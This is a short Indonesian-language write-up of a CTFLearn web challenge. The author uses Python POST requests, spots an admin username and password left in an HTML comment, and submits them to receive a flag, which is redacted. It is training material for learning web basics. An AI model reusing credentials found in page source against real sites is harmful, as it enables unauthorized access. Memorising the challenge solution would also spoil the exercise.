---
Title: CTFLearn write-up - Post practice (web)
Date: 2022-02-02
Tags:
- ctf
- writeup
categories:
- write ups
Description: "secara garis besar kita harus melakukan post request terhadap url http://165.227.106.113/post.php seperti..."
Author: 0xHynz
---

Post practice

`This website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe there is still some way to authenticate? http://165.227.106.113/post.php`

secara garis besar kita harus melakukan post request terhadap url `http://165.227.106.113/post.php` seperti penjelasan dalam
challenge ini, yaitu website ini membutuhkan authentication lewat POST.

ketika hanya mengunjungi situsnya dengan browser, maka akan terdapat tulisan seperti ini

`This site takes POST data that you have not submitted!`

disini saya mencoba untuk melihat secara keseluruhan dari output yang saya terima melalui fitur view-source, namun
saya mencoba melihat isi webnya hanya dengan library request dipython saja.


```
from requests import post


url = "http://165.227.106.113/post.php"

r = post(url)
print(r.headers,r.status_code)
print()
print(r.text)
```

maka saya menerima output seperti ini

```
{'Server': 'nginx/1.4.6 (Ubuntu)', 'Date': 'Wed, 02 Feb 2022 09:08:07 GMT', 'Content-Type': 'text/html', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'X-Powered-By': 'PHP/5.5.9-1ubuntu4.22', 'Content-Encoding': 'gzip'} 200

<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->
```

disini saya sudah bisa menebak apa selanjutnya, kita diperlihatkan username dan password namun
kita menerima pesan bahwa post data belum kita isi.


```
from requests import post

url = "http://165.227.106.113/post.php"

r = post(url)
print(r.headers,r.status_code)
print()
print(r.text)

data = {'username':'admin','password':'71urlkufpsdnlkadsf'}
print (post(url,data=data).text)
```

saya menambahkan data yang diberikan hasil dari source code tersebut, yaitu username dan password.
maka flag akan kita dapatkan.

```
{'Server': 'nginx/1.4.6 (Ubuntu)', 'Date': 'Wed, 02 Feb 2022 09:08:07 GMT', 'Content-Type': 'text/html', 'Transfer-Encoding': 'chunked', 'Connection': 'keep-alive', 'X-Powered-By': 'PHP/5.5.9-1ubuntu4.22', 'Content-Encoding': 'gzip'} 200

<h1>This site takes POST data that you have not submitted!</h1><!-- username: admin | password: 71urlkufpsdnlkadsf -->
<h1>flag{............}</h1>
```


